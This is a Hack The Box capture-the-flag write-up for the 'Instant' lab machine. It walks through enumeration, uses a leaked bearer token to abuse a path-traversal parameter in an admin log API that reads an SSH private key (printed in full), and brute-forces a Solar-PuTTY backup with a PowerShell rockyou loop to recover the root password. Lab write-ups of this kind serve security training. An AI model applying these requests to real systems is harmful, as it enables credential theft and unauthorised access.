---
title: HTB Instant
date: 2024-10-20 08:50:00 +/-TTTT
categories: [Hackthebox, Windows]
tags: [api, powershell]     # TAG names should always be lowercase
description: 

image:
  path: assets\instant\cropped-box-instant.png
---



### Nmap scan
```sh
nmap -sC -sV 10.10.11.37    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-19 09:23 EDT
Nmap scan report for 10.10.11.37
Host is up (0.017s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA)
|_  256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://instant.htb/
|_http-server-header: Apache/2.4.58 (Ubuntu)
Service Info: Host: instant.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
> findings
> - added instant.htb to /etc/hosts

### Directory brute forcing
```sh
feroxbuster -u http://instant.htb -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt 
---
301      GET        9l       28w      314c http://instant.htb/downloads => 
200      GET       73l      165w     2022c http://instant.htb/js/scripts.js
200      GET       49l      241w    13102c http://instant.htb/img/logo.png
200      GET      337l     1155w    16379c http://instant.htb/index.html
301      GET        9l       28w      315c http://instant.htb/javascript => 
200      GET      245l     1305w   143898c http://instant.htb/img/blog-1.jpg
200      GET      195l     1097w   116351c http://instant.htb/img/blog-2.jpg
200      GET      434l     2599w   304154c http://instant.htb/img/blog-3.jpg
200      GET      337l     1155w    16379c http://instant.htb/
200      GET     7852l    19986w   199577c http://instant.htb/css/default.css
200      GET        1l        4w       16c http://instant.htb/img/
200      GET        1l        4w       16c http://instant.htb/downloads/
200      GET    10907l    44549w   289782c http://instant.htb/javascript/jquery/jquery
200      GET    18696l   115382w  9319615c http://instant.htb/downloads/instant.apk
[####################] - 2m    301088/301088  0s      found:18      errors:40029  
[####################] - 2m     43008/43008   463/s   http://instant.htb/ 
[####################] - 2m     43008/43008   463/s   http://instant.htb/js/ 
[####################] - 2m     43008/43008   463/s   http://instant.htb/css/ 
[####################] - 2m     43008/43008   471/s   http://instant.htb/img/ 
[####################] - 2m     43008/43008   449/s   http://instant.htb/downloads/ 
[####################] - 2m     43008/43008   467/s   http://instant.htb/javascript/ 
```
> only found the download page really, but this was not hidden

### Subdomain enumeration
```sh
ffuf -u http://instant.htb -H 'Host: FUZZ.instant.htb' -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -fc 301

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/'       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://instant.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt
 :: Header           : Host: FUZZ.instant.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 301
________________________________________________

swagger-ui              [Status: 302, Size: 203, Words: 18, Lines: 6, Duration: 16ms]
```
Add this `swagger-ui` subdomain to the `/etc/hosts` file
A quick google finds that swagger ui is a rest api. 

Using feroxbuster to bruteforce the new found vhost:
```sh
feroxbuster -u http://swagger-ui.instant.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
```
> Finding: http://swagger-ui.instant.htb/apidocs/

This webpage was empty, but a refresh get request in burp responded with a python header:
`Werkzeug/3.0.3 Python/3.12.3`


---
### APK download

This file had a bearer token allowing me to authorize to the `/apidocs/`, which revealed some api stuff that you can see in the image below:
![alt text](image.png)
 This get request responded with the following:
```json
Response body
Download

{
  "Status": 200,
  "Users": [
    {
      "email": "admin@instant.htb",
      "role": "Admin",
      "secret_pin": 87348,
      "status": "active",
      "username": "instantAdmin",
      "wallet_id": "f0eca6e5-783a-471d-9d8f-0162cbc900db"
    },
    {
      "email": "shirohige@instant.htb",
      "role": "instantian",
      "secret_pin": 42845,
      "status": "active",
      "username": "shirohige",
      "wallet_id": "458715c9-b15e-467b-8a3d-97bc3fcf3c11"
    }
  ]
}
```

```
instantAdmin
admin@instant.htb
shirohige
shirohige@instant.htb
```

In the webpage i fount this url: 
```http
http://swagger-ui.instant.htb/api/v1/admin/read/log
```

And this command allowed me to grab the ssh keys, using burpsuite as proxy in curl command, so i got a better output of the ssh key:
```sh
curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=../.ssh/id_rsa" -H  "accept: application/json" -H  "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA" --proxy 127.0.0.1:8080
```

```json
{"/home/shirohige/logs/../.ssh/id_rsa":["-----BEGIN RSA PRIVATE KEY-----\n","MIIEowIBAAKCAQEA7cwfbg/X8Pc662fHl6qS6t50NtmAfzGhZRFB4feJlapk3gQH\n","kp4UTXZ3Opu/AoRu+saNdrNwtQlyE3YgK+aPdOdtMFswKSN1K6AWEhyBlVeBdeCZ\n","+paOJbsZ5mWHwyYubTty74fL770e5mYcw3WRHw4/cdJ/bqLBYMabMKdIee+ohntR\n","LqQ+tbID4PemPcnusHituHxPLEM/0zIWfqFgMFYeQxDUtzJH4HIeTAiRlIqulo5z\n","MTMKAu8oeGxU5JVhQAY5/yHDNxS0y4ldGlXpURTucsR/mMfSJ+iokE9h5OU68qUW\n","hIfbca/xXPMGmww7eJo2hPQRjFg9EIUK3/i/FQIDAQABAoIBAAdMwVg+b0QWlX3y\n","08s28XH5Uzr4e/vWQ7HtENyFc06fX5+lza+1X5fYf6TScXomePEE1a84/J2UxSY4\n","yu2zaGBP1xJpcjXea0iOuQQO+6FggXkODzFZ8XzSB2Otu+MEkd9I4xMxqX6Eto/0\n","aYSh4CBtGQspnuoqtTdUfCDHDzADBBL9Jlw+mZNXEm4sy2/YY4qY1aF3Z0HXUlI4\n","ETTKb+WLE/EqoW4YkGAIuDmN4j/5YKKGZoEVn1ZMw6BHGTjHQ0CjM21yvYx/C97j\n","J7agNzMMWiI9mhA/4uYlJn3baRLre6R2dNm06jR87KLX1rittkeyMHSgeKPsglwX\n","STwurqECgYEA/pig9gRFlhKmnX4a1ysCG4K9lAN5qe6RYNXLx6ChPRHDwda1yo3y\n","xrqi/IH7kGMoYuoBrcHACEFc1pn/CSuaNWkw6EiGyrOnmvMkR38OZFsxPfLpctNo\n","QbsYsTuaidkGDydUZ33EjX6FVlVjcsKdH4pHFWnEyzD64zgLX9keA5ECgYEA7xvI\n","KGLZ8RHAgHYs6vx9+O4vzKm+n+ht4RWR0J0bg43U1Av/xR83rrX9P1Fy+cnJ4dEb\n","lMlVTfyvqOEc6wfKn17+XovZo+10DYgu+Gj2UMbdc8/dN4ClINNITaVZ5GkzRgOW\n","lly0rquH8l8x5Ou92+/2LV3UPOlaeRfeQgJuuUUCgYApliLMrLv1HIzMsvmNZgAN\n","IFj5IWwxHr/ucl27+Pf9crZoJjtBn9glL/1Jg63k0t2Y8qJdkIVek9anUzY+eDnT\n","OaB8gMRLvfbFr6ugZheiuuabON97Gx8vhXEuGg9PLvz3YrQ9x2RgvGbpSD9bUoC5\n","0ytzSviTPCfvD4uEF4H4kQKBgCntkTejvdvL5Rmhn1bFV8Gi4rbcvRSFSV9CzQLr\n","ybtTz5IvWHZUdwsn1nSX77VlcQUsCc4ZT+ARAyx17QA5qYowuiISG+Pm64bD7piY\n","rziS5po8ROpKoKoU4oTbDdxDpj4Muwc60mQeqAQUNUeTHwPGHEDwRxs3QCojyVGB\n","47CRAoGBAJ/2N/A4Kl6XjhF6MDBT0ajqezqyoEZDZ0R2iJinU9jsxZwYssaSZZ89\n","dSpu01SUBow567rakwJzq/Bm8m+ErljkRuBNtbqi4X+ug/yrW5A39OrcwBkAHxSM\n","LyinZgxrfc4z1ZEY3sl2H3StywnbSv9p+G4Dp7BYbgZ7So3vPo7o\n","-----END RSA PRIVATE KEY-----\n"],"Status":201}
```
Still this key is in a terrible format, so another way is through the terminal:
```sh
curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=../.ssh/id_rsa" \
-H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA" \
| jq -r '.[].[]' \
| sed '/^$/d' > id_rsa
```
This fixed the whole key as you can see:
![alt text](image-1.png)
Used `chmod 600` to give the key the right permissions and logged in with ssh
```
ssh -i id_rsa shirohige@10.10.11.37
```

---
## First user flag
### Initial enumeration
in the following directory i found a .db file which might contian some creds:
```
shirohige@instant:~/projects/mywallet/Instant-Api/mywallet/instance$
```

Once i checked the /opt folder I found a folder that is not there on a default installation.
```
shirohige@instant:/opt/backups/Solar-PuTTY$ ls
sessions-backup.dat
```

when I cat this file it looks like some base64 encrypted string:
```
cat sessions-backup.dat 
ZJlEkpkqLgj2PlzCyLk4gtCfsGO2CMirJoxxdpclYTlEshKzJwjMCwhDGZzNRr0fNJMlLWfpbdO7l2fEbSl/OzVAmNq0YO94RBxg9p4pwb4upKiVBhRY22HIZFzy6bMUw363zx6lxM4i9kvOB0bNd/4PXn3j3wVMVzpNxuKuSJOvv0fzY/ZjendafYt1Tz1VHbH4aHc8LQvRfW6Rn+5uTQEXyp4jE+ad4DuQk2fbm9oCSIbRO3/OKHKXvpO5Gy7db1njW44Ij44xDgcIlmNNm0m4NIo1Mb/2ZBHw/MsFFoq/TGetjzBZQQ/rM7YQI81SNu9z9VVMe1k7q6rDvpz1Ia7JSe6fRsBugW9D8GomWJNnTst7WUvqwzm29dmj7JQwp+OUpoi/j/HONIn4NenBqPn8kYViYBecNk19Leyg6pUh5RwQw8Bq+6/OHfG8xzbv0NnRxtiaK10KYh++n/Y3kC3t+Im/EWF7sQe/syt6U9q2Igq0qXJBF45Ox6XDu0KmfuAXzKBspkEMHP5MyddIz2eQQxzBznsgmXT1fQQHyB7RDnGUgpfvtCZS8oyVvrrqOyzOYl8f/Ct8iGbv/WO/SOfFqSvPQGBZnqC8Id/enZ1DRp02UdefqBejLW9JvV8gTFj94MZpcCb9H+eqj1FirFyp8w03VHFbcGdP+u915CxGAowDglI0UR3aSgJ1XIz9eT1WdS6EGCovk3na0KCz8ziYMBEl+yvDyIbDvBqmga1F+c2LwnAnVHkFeXVua70A4wtk7R3jn8+7h+3Evjc1vbgmnRjIp2sVxnHfUpLSEq4oGp3QK+AgrWXzfky7CaEEEUqpRB6knL8rZCx+Bvw5uw9u81PAkaI9SlY+60mMflf2r6cGbZsfoHCeDLdBSrRdyGVvAP4oY0LAAvLIlFZEqcuiYUZAEgXgUpTi7UvMVKkHRrjfIKLw0NUQsVY4LVRaa3rOAqUDSiOYn9F+Fau2mpfa3c2BZlBqTfL9YbMQhaaWz6VfzcSEbNTiBsWTTQuWRQpcPmNnoFN2VsqZD7d4ukhtakDHGvnvgr2TpcwiaQjHSwcMUFUawf0Oo2+yV3lwsBIUWvhQw2g=
```

I checked if there was a valid exploit for the folder names and file that is in this directory, and after a quick google i did find something that might work in my case. [solarputtydecrypt](https://github.com/VoidSec/SolarPuttyDecrypt). A post-exploitation/forensics tool to decrypt SolarPuTTY's sessions files

First the file has to be transferred from the target host to my attackhost, and then from my attack host t my windows host as the exploit was only for windows. I did this using simple python severs. 

I tried to run the exploit but the exploit needs some type of password, which i didn't find. 
But i managed to find this script on google which helped me extract the password:
```
$filePath = "rockyou.txt"
$exePath = ".\SolarPuttyDecrypt.exe"
$datFile = "..\sessions-backup.dat"
Get-Content $filePath | ForEach-Object {
    $line = $_
    & $exePath $datFile $line
}
```
![alt text](image-2.png)
As you can see in the image it scrolled very fast through the rockyou.txt password list and then it would create  a file with the decrypted key. 
![alt text](image-3.png)
The passwords is:
```
Username: root
Password: 12**24nzC!r0c%q12
```

Now with a simple `su root` with that password gives you root on the ssh connection., 
![alt text](image-4.png)
